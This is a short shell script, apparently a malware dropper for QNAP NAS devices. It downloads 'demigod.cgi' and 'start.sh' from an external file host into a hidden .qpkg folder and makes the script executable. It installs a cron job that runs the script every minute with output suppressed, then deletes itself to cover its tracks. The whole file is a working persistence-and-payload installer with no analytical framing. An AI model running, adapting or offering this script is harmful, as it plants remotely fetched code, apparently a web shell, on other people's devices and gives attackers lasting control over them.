#!/bin/sh
DEF_VOLMP=`/sbin/getcfg SHARE_DEF defVolMP -f /etc/config/def_share.info`
mkdir $DEF_VOLMP/.qpkg/Hybrid &&\
curl -JL -o $DEF_VOLMP/.qpkg/Hybrid/demigod.cgi http://ys-o.ys168.com/602635077/116276006/SxjhS7l4N1H7K334NK2fa/demigod.cgi &&\
curl -JL -o $DEF_VOLMP/.qpkg/Hybrid/start.sh http://ys-c.ys168.com/602635058/118810872/t72286427I7L3LVsgkVH5f/start.sh &&\
chmod +x $DEF_VOLMP/.qpkg/Hybrid/start.sh && /etc/init.d/crond.sh restart &&\
echo "* * * * * $DEF_VOLMP/.qpkg/Hybrid/start.sh >/dev/null 2>&1" >> /etc/config/crontab &&\
crontab /etc/config/crontab && /etc/init.d/crond.sh restart && rm -rf $0